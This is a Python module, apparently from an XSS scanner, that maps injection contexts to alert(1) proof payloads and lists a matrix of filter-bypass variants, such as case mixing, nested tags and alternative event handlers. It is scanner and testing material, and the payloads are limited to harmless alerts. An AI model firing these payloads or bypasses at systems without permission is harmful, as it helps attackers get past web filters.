"""payload 语料库。

原则：
* 判定标准只有一个 —— 弹出 alert(1)（黑天鹅 / canary 思路：最小、可判定、无副作用）。
* 不包含窃取 Cookie、跳转、发起外连、写存储、消耗资源的写法。
* 每个 payload 都标注它依赖的注入上下文（见 engine.CONTEXT_LABELS）。
"""

from __future__ import annotations

# (类别, payload)
Payload = tuple[str, str]

# 按上下文给出的首选 payload，越靠前越「无交互直接触发」
CONTEXT_PAYLOADS: dict[str, list[Payload]] = {
    "html_text": [
        ("script 标签", "<script>alert(1)</script>"),
        ("img onerror", "<img src=x onerror=alert(1)>"),
        ("svg onload", "<svg onload=alert(1)>"),
        ("details ontoggle", "<details open ontoggle=alert(1)>"),
        ("body onload", "<body onload=alert(1)>"),
        ("input autofocus", "<input autofocus onfocus=alert(1)>"),
        ("video onerror", "<video><source onerror=alert(1)>"),
    ],
    "attr_dq": [
        ("闭合双引号 + script", "\"><script>alert(1)</script>"),
        ("闭合双引号 + img", "\"><img src=x onerror=alert(1)>"),
        ("新增事件属性", "\" autofocus onfocus=\"alert(1)"),
        ("闭合双引号 + svg", "\"><svg onload=alert(1)>"),
    ],
    "attr_sq": [
        ("闭合单引号 + script", "'><script>alert(1)</script>"),
        ("闭合单引号 + img", "'><img src=x onerror=alert(1)>"),
        ("新增事件属性", "' autofocus onfocus='alert(1)"),
    ],
    "attr_unq": [
        ("闭合标签 + img", "><img src=x onerror=alert(1)>"),
        ("注入事件属性", " onmouseover=alert(1) x="),
    ],
    "tag_space": [
        ("注入事件属性", " onmouseover=alert(1)"),
        ("闭合标签 + img", "><img src=x onerror=alert(1)>"),
    ],
    "script": [
        ("跳出单引号字符串", "';alert(1);//"),
        ("跳出双引号字符串", "\";alert(1);//"),
        ("闭合脚本块", "</script><img src=x onerror=alert(1)>"),
        ("模板插值", "${alert(1)}"),
    ],
    "comment": [
        ("闭合注释 + img", "--><img src=x onerror=alert(1)>"),
        ("闭合注释 + script", "--><script>alert(1)</script>"),
    ],
    "rcdata": [
        ("闭合 textarea", "</textarea><img src=x onerror=alert(1)>"),
        ("闭合 title", "</title><img src=x onerror=alert(1)>"),
    ],
    "style": [
        ("闭合 style", "</style><img src=x onerror=alert(1)>"),
    ],
    "url": [
        ("javascript 协议", "javascript:alert(1)"),
        ("闭合属性 + img", "\"><img src=x onerror=alert(1)>"),
    ],
}


# 拦截 / 过滤出现时逐个尝试的绕过矩阵。
# 每项都是完整的「注入值」，由检测器原样塞进参数。
BYPASS_MATRIX: list[tuple[str, str, str]] = [
    # (分组, 手法, payload)
    ("大小写", "混写标签名", "<ScRiPt>alert(1)</ScRiPt>"),
    ("大小写", "混写事件名", "<img src=x OnErRoR=alert(1)>"),
    ("标签语法", "script 后加空格", "<script >alert(1)</script >"),
    ("标签语法", "script 后换行", "<script\n>alert(1)</script>"),
    ("标签语法", "script 用斜杠挂属性", "<script/src=x>alert(1)</script>"),
    ("标签语法", "script 多余属性", "<script x>alert(1)</script>"),
    ("标签语法", "img 斜杠分隔属性", "<img/src/onerror=alert(1)>"),
    ("标签语法", "img 换行分隔属性", "<img\nsrc=x\nonerror=alert(1)>"),
    ("标签语法", "img 制表符分隔", "<img\tsrc=x\tonerror=alert(1)>"),
    ("标签语法", "img 属性值加引号", "<img src=\"x\" onerror=\"alert(1)\">"),
    ("嵌套拆分", "script 双写（针对删一次）", "<script<script>>alert(1)</script>"),
    ("嵌套拆分", "事件名双写（针对删 onerror）", "<img src=x oonnerrrorr=alert(1)>"),
    ("替代标签", "svg onload", "<svg onload=alert(1)>"),
    ("替代标签", "svg + script", "<svg><script>alert(1)</script></svg>"),
    ("替代标签", "details ontoggle", "<details open ontoggle=alert(1)>"),
    ("替代标签", "body onload", "<body onload=alert(1)>"),
    ("替代标签", "iframe srcdoc", "<iframe srcdoc=\"<script>alert(1)</script>\">"),
    ("替代标签", "video/source onerror", "<video><source onerror=alert(1)>"),
    ("替代标签", "audio onerror", "<audio src=x onerror=alert(1)>"),
    ("替代标签", "marquee onstart", "<marquee onstart=alert(1)>"),
    ("替代标签", "math + img", "<math><mtext></mtext><img src=x onerror=alert(1)>"),
    ("交互事件", "input autofocus", "<input autofocus onfocus=alert(1)>"),
    ("交互事件", "select autofocus", "<select autofocus onfocus=alert(1)>"),
    ("交互事件", "textarea autofocus", "<textarea autofocus onfocus=alert(1)>"),
    ("交互事件", "a javascript 协议", "<a href=javascript:alert(1)>点我</a>"),
    ("JS 写法", "alert 模板字符串", "<img src=x onerror=alert`1`>"),
    ("JS 写法", "window.alert", "<img src=x onerror=window.alert(1)>"),
    ("JS 写法", "self 索引调用", "<img src=x onerror=self['alert'](1)>"),
    ("JS 写法", "alert.call", "<img src=x onerror=alert.call(null,1)>"),
    ("JS 写法", "void 包裹", "<img src=x onerror=void alert(1)>"),
    ("编码", "实体编码标签（对照）", "&#60;img src=x onerror=alert(1)&#62;"),
    ("编码", "十六进制实体（对照）", "&#x3c;img src=x onerror=alert(1)&#x3e;"),
]

# URL 属性（href/src/...）里的候选，单独一组
URL_ATTR_PAYLOADS: list[Payload] = [
    ("javascript 协议", "javascript:alert(1)"),
    ("闭合属性 + img", "\"><img src=x onerror=alert(1)>"),
    ("闭合引号 + 事件", "\" autofocus onfocus=\"alert(1)"),
]


def payloads_for(context: dict) -> list[Payload]:
    """按上下文挑首选 payload 列表。"""
    kind = context.get("context", "html_text")
    if kind in ("attr_dq", "attr_sq", "attr_unq") and context.get("attr") in {
        "href",
        "src",
        "action",
        "formaction",
        "data",
        "poster",
        "xlink:href",
    }:
        return URL_ATTR_PAYLOADS + CONTEXT_PAYLOADS[kind]
    return CONTEXT_PAYLOADS.get(kind, CONTEXT_PAYLOADS["html_text"])


def canary_token() -> str:
    """每轮随机标记，避免命中页面里本来就有的内容。"""
    import secrets
    import string

    alphabet = string.ascii_letters + string.digits
    return "xs" + "".join(secrets.choice(alphabet) for _ in range(8))

